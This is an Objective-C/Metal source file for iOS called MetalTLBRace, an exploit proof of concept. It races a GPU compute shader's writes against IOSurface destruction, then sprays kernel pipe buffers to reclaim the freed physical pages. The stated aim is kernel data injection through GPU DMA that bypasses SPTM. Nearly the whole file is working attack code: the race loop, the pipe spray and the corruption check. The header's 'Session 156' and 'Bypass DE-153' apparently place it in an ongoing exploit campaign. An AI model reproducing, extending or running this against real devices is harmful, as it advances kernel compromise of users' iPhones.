/*
 * MetalTLBRace — GPU TLB Stale Mapping Exploitation
 * Session 156: Bypass DE-153 (WebGL defers deletion)
 *
 * Native Metal app controls IOSurface lifecycle directly.
 * Creates IOSurface -> Metal compute shader -> destroy surface -> spray pipes.
 * If GPU writes to reclaimed pipe page -> kernel data injection via DMA.
 * GPU DMA bypasses SPTM (CPU-only protection).
 *
 * Build: xcrun -sdk iphoneos clang -arch arm64 -mios-version-min=17.0 -O2
 *        -o MetalTLBRace metal_tlb_race.m -isysroot ...
 *        -framework CoreFoundation -framework Metal -framework IOSurface
 *        -framework Foundation -fobjc-arc
 */

#import <Foundation/Foundation.h>
#import <Metal/Metal.h>
#import <IOSurface/IOSurfaceRef.h>
#include <dlfcn.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>

#define SURFACE_W       256
#define SURFACE_H       256
#define BPP             4
#define SURFACE_SIZE    (SURFACE_W * SURFACE_H * BPP)  /* 256KB */
#define NUM_RACES       500
#define NUM_PIPES       5000
#define PIPE_SIZE       16384   /* 16KB page-aligned */
#define GPU_MARKER      0x42   /* What GPU shader writes */
#define PIPE_MARKER     0xAA   /* What we write to pipes */

static int g_pipes[NUM_PIPES][2];
static int g_pipe_count = 0;

/* Spray pipe buffers to reclaim freed physical pages */
static void spray_pipes(void) {
    char buf[PIPE_SIZE];
    memset(buf, PIPE_MARKER, sizeof(buf));

    for (int i = 0; i < NUM_PIPES; i++) {
        if (pipe(g_pipes[i]) < 0) break;
        *(uint64_t *)buf = 0xAAAA000000000000ULL | (uint64_t)i;
        if (write(g_pipes[i][1], buf, PIPE_SIZE) > 0)
            g_pipe_count++;
    }
    fprintf(stderr, "[TLB] Sprayed %d pipe buffers\n", g_pipe_count);
}

/* Check pipe buffers for GPU corruption */
static int check_pipes(void) {
    char buf[PIPE_SIZE];
    int corrupted = 0;

    for (int i = 0; i < g_pipe_count; i++) {
        ssize_t n = read(g_pipes[i][0], buf, PIPE_SIZE);
        if (n <= 0) continue;

        /* Check if GPU wrote its marker into our pipe data */
        int gpu_bytes = 0;
        for (int j = 8; j < n; j++) {
            if ((unsigned char)buf[j] == GPU_MARKER) gpu_bytes++;
        }

        if (gpu_bytes > 16) {
            fprintf(stderr, "[TLB] *** PIPE %d CORRUPTED: %d GPU bytes (0x%02X) ***\n",
                    i, gpu_bytes, GPU_MARKER);
            /* Dump first 64 bytes for analysis */
            fprintf(stderr, "[TLB] Data: ");
            for (int j = 0; j < 64 && j < n; j++)
                fprintf(stderr, "%02X", (unsigned char)buf[j]);
            fprintf(stderr, "\n");
            corrupted++;
        }
    }
    return corrupted;
}

/* Close all pipes to free kernel pages */
static void close_pipes(void) {
    for (int i = 0; i < g_pipe_count; i++) {
        close(g_pipes[i][0]);
        close(g_pipes[i][1]);
    }
    g_pipe_count = 0;
}

int main(int argc, char *argv[]) {
    @autoreleasepool {
        fprintf(stderr, "=== MetalTLBRace v1 ===\n");
        fprintf(stderr, "Races: %d, Pipes: %d, Surface: %dx%d\n",
                NUM_RACES, NUM_PIPES, SURFACE_W, SURFACE_H);

        /* Get Metal device */
        id<MTLDevice> device = MTLCreateSystemDefaultDevice();
        if (!device) {
            fprintf(stderr, "[TLB] No Metal device\n");
            return 1;
        }
        fprintf(stderr, "[TLB] GPU: %s\n", [[device name] UTF8String]);

        id<MTLCommandQueue> queue = [device newCommandQueue];

        /* Compute shader writes GPU_MARKER into IOSurface-backed texture.
         * The texture's physical pages are what we're racing against. */
        NSString *src = @"#include <metal_stdlib>\n"
            "using namespace metal;\n"
            "kernel void fill(texture2d<uchar, access::write> tex [[texture(0)]],\n"
            "                 uint2 pos [[thread_position_in_grid]]) {\n"
            "    tex.write(uchar4(0x42, 0x42, 0x42, 0x42), pos);\n"
            "}\n";

        NSError *err = nil;
        id<MTLLibrary> lib = [device newLibraryWithSource:src options:nil error:&err];
        if (!lib) {
            fprintf(stderr, "[TLB] Shader compile failed: %s\n",
                    [[err description] UTF8String]);
            return 1;
        }

        id<MTLFunction> func = [lib newFunctionWithName:@"fill"];
        id<MTLComputePipelineState> pipeline =
            [device newComputePipelineStateWithFunction:func error:&err];
        if (!pipeline) {
            fprintf(stderr, "[TLB] Pipeline failed\n");
            return 1;
        }
        fprintf(stderr, "[TLB] Metal pipeline ready\n");

        int total_corrupted = 0;

        for (int race = 0; race < NUM_RACES; race++) {
            /* Step 1: Create IOSurface */
            NSDictionary *props = @{
                (id)kIOSurfaceWidth: @(SURFACE_W),
                (id)kIOSurfaceHeight: @(SURFACE_H),
                (id)kIOSurfaceBytesPerElement: @(BPP),
                (id)kIOSurfacePixelFormat: @(0x42475241), /* BGRA */
            };
            IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)props);
            if (!surface) continue;

            /* Step 2: Create Metal texture backed by IOSurface */
            MTLTextureDescriptor *desc = [MTLTextureDescriptor
                texture2DDescriptorWithPixelFormat:MTLPixelFormatBGRA8Unorm
                width:SURFACE_W height:SURFACE_H mipmapped:NO];
            desc.usage = MTLTextureUsageShaderWrite;

            id<MTLTexture> tex = [device newTextureWithDescriptor:desc
                                  iosurface:surface plane:0];

            /* Step 3: Dispatch compute shader writing to IOSurface-backed texture.
             * This establishes DART TLB entries for the IOSurface physical pages.
             * We use MTLDispatchTypeSerial but do NOT waitUntilCompleted — GPU runs
             * asynchronously so we can race the destroy+pipe-spray below. */
            id<MTLCommandBuffer> cmdBuf = [queue commandBuffer];
            id<MTLComputeCommandEncoder> enc = [cmdBuf computeCommandEncoder];
            [enc setComputePipelineState:pipeline];
            [enc setTexture:tex atIndex:0];  /* IOSurface-backed texture is the target */

            MTLSize grid = MTLSizeMake(SURFACE_W, SURFACE_H, 1);
            MTLSize group = MTLSizeMake(8, 8, 1);
            [enc dispatchThreads:grid threadsPerThreadgroup:group];
            [enc endEncoding];
            [cmdBuf commit];  /* GPU starts writing to IOSurface pages asynchronously */
            usleep(200);      /* 200µs: GPU has started but may not have finished */

            /* Step 5: RACE — destroy IOSurface while GPU still working */
            /* GPU TLB entries still map to the surface's physical pages */
            CFRelease(surface);
            tex = nil;

            /* Step 6: Immediately spray pipes to reclaim freed physical pages */
            spray_pipes();

            /* Step 7: Wait for GPU to finish (writing to freed pages) */
            [cmdBuf waitUntilCompleted];

            /* Step 8: Check if GPU wrote into any pipe buffer */
            int c = check_pipes();
            total_corrupted += c;

            /* Clean up for next race */
            close_pipes();

            if (c > 0) {
                fprintf(stderr, "[TLB] *** RACE %d: %d pipes corrupted by GPU ***\n",
                        race, c);
                break;
            }

            if (race % 50 == 0) {
                fprintf(stderr, "[TLB] Race %d/%d complete, corrupted=%d\n",
                        race, NUM_RACES, total_corrupted);
            }
        }

        fprintf(stderr, "=== RESULT: %d total pipes corrupted by GPU ===\n",
                total_corrupted);
        if (total_corrupted > 0) {
            fprintf(stderr, "*** GPU TLB RACE SUCCESS — KERNEL DATA INJECTION ***\n");
        }

        /* Hold process alive for crash report collection */
        void *cf = dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", 1);
        if (cf) {
            void (*run)(void) = dlsym(cf, "CFRunLoopRun");
            if (run) run();
        }
        while (1) { __asm__ volatile("yield"); }
    }
    return 0;
}
